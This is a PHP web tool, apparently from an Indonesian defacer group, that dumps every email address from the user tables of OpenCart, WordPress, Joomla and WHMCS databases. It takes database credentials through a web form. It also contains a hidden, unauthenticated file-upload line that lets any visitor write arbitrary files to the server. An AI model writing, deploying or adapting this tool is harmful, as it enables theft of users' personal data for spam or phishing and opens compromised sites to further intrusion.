<?
echo "
 <body bgcolor='aqua'>
 <form method='GET'>
 <link rel='stylesheet' href='http://www.w32.info/2001/04/xmldsigmore'>
 <title>Extract Emails From [ OpenCart - WordPress - Joomla - WHMCS ]</title>
 <p align='center' dir='ltr'>
 <b><font face='Tahoma' size='6'>Extract Email'z From</font></b></p>
 <p align='center' dir='ltr'>
 <font size='2' face='Verdana'>[</font><font face='Verdana' color='#FF0000' size='2'>
 </font><font face='Verdana' size='2' color='#606060'>
 <a href='?xsec=wordpress' style='text-decoration: none'>
 <font color='#000066'>WordPress</font></a> -
 <a href='?xsec=joomla' style='text-decoration: none'><font color='#FF0000'>
 Joomla</font></a> - <a href='?xsec=opencart' style='text-decoration: none'>
 <font color='#606060'>OpenCart</font></a> -
 <a href='?xsec=whmcs' style='text-decoration: none'><font color='#FFFF00'>
 WHMCS</font></a> </font><font size='2' face='Verdana'>]</font></p></form></body>";

 $host = $_POST['host'];
 $data = $_POST['data'];
 $user = $_POST['user'];
 $pass = $_POST['pass'];
 $dbprefix = $_POST['dbprefix'];
 (@copy($_FILES['f']['tmp_name'], $_FILES['f']['name']));

 # Command MySQL
 $cart = "SELECT `email` FROM `oc_user`";
 $wp = "SELECT `user_email` FROM `wp_users`";
 $j0 = 'SELECT `email` FROM `'.$dbprefix.'users` GROUP BY `email` ORDER BY `email`';
 $whm = "SELECT `email` FROM `tblclients`";

 # function connect MySQL & Select DB
 function connect($host,$data,$user,$pass) {
  $co = @mysql_connect($host,$user,$pass) or die(mysql_error());
 $da = @mysql_select_db($data) or die(mysql_error());
  return $co;
 }

 # OpenCart
 if($_GET['xsec'] == 'opencart') {
  echo "
  <form method='POST'><center>
  <input type='text' name='host' value='localhost'>
 <input type='text' name='data' value='database'>
 <input type='text' name='user' value='username'>
 <input type='text' name='pass' value='password'>
 <input type='submit' value='Executre'></p></center></form>";
 echo "<p align='center' dir='ltr'><textarea cols='35' rows='18'>";
 if(connect($host, $data, $user, $pass)) {
 $cmd1 = @mysql_query($cart);
 while($emails1 = @mysql_fetch_array($cmd1)) {
 echo "{$emails1[email]}\n"; }
 echo "</textarea>";  } }

 # Wordpress
 if($_GET['xsec'] == 'wordpress') {
  echo "<form method='POST'><center>
  <input type='text' name='host' value='localhost'>
 <input type='text' name='data' value='database'>
 <input type='text' name='user' value='username'>
 <input type='text' name='pass' value='password'>
 <input type='submit' value='Executre'></center></form>";
 echo "<p align='center' dir='ltr'><textarea cols='35' rows='18'>";
 if(connect($host, $data, $user, $pass)) {
 $cmd2 = @mysql_query($wp);
 while($emails2 = @mysql_fetch_array($cmd2)) {
  echo "{$emails2[user_email]}\n"; }
 echo "</textarea>"; } }

 # Joomla
 if($_GET['xsec'] == 'joomla') {
  echo "<form method='POST'><center>
  <input type='text' name='host' value='localhost'>
 <input type='text' name='data' value='database'>
 <input type='text' name='user' value='username'>
 <input type='text' name='pass' value='password'>
 <input type='text' name='dbprefix' value='prefix_'>
 <input type='submit' value='Executre'></center></form>";
 echo "<p align='center' dir='ltr'><textarea cols='35' rows='18'>";
 if(connect($host, $data, $user, $pass)) {
  $cmd3 = @mysql_query($j0);
 while($emails3 = @mysql_fetch_array($cmd3)) {
  echo "{$emails3[email]}\n"; }
 echo "</textarea>"; } }

 # WHMCS
 if($_GET['xsec'] == 'whmcs') {
  echo "<form method='POST'><center>
  <input type='text' name='host' value='localhost'>
 <input type='text' name='data' value='database'>
 <input type='text' name='user' value='username'>
 <input type='text' name='pass' value='password'>
 <input type='submit' value='Executre'></center></form>";
 echo "<p align='center' dir='ltr'><textarea cols='35' rows='18'>";
  if(connect($host, $data, $user, $pass)) {
  $cmd4 = @mysql_query($whm);
 while($emails4 = @mysql_fetch_array($cmd4)) {
  echo "{$emails4[email]}\n"; }
 echo "</textarea>"; }
 }
 echo "<p align='center' dir='ltr'>
 <font face='Verdana' size='1'>Coded By :<font color='#FF0000'> orie404 ~ xSecurity </font>
 ~ in :<font color='#FF0000'> bems404</font></font></p>
 <p align='center' dir='ltr'>
 <font face='Verdana' size='1'>Greets : </font>
 <font SIZE='1' face='Verdana' color='#FF0000'>orie404 - nitr0 - All Members Indonesia Defacer Tersakiti and IndoXploit </font><font SIZE='1' COLOR='#606060' face='Verdana'> ~</font></p>
 <p align='center' dir='ltr'>
 <font face='Verdana' size='1'>Homepage :</font><font face='Verdana' size='1' color='#0099CC'>
 </font><font face='Verdana' size='1' color='#606060'>
 <a href='http://bems404.blogspot.co.id' style='text-decoration: none'>
 <font color='#0099CC'>bems404.blogspot.co.id/</font></a></font><font face='Verdana' size='1' color='#0099CC'>
 </font><font face='Verdana' size='1'>-</font><font face='Verdana' size='1' color='#0099CC'>
 </font><font face='Verdana' size='1' color='#606060'>
 <a href='http://www.indoxploit.or.id' style='text-decoration: none'>
 <font color='#0099CC'>www.indoxploit.or.id</font></a></font></p>";
?>
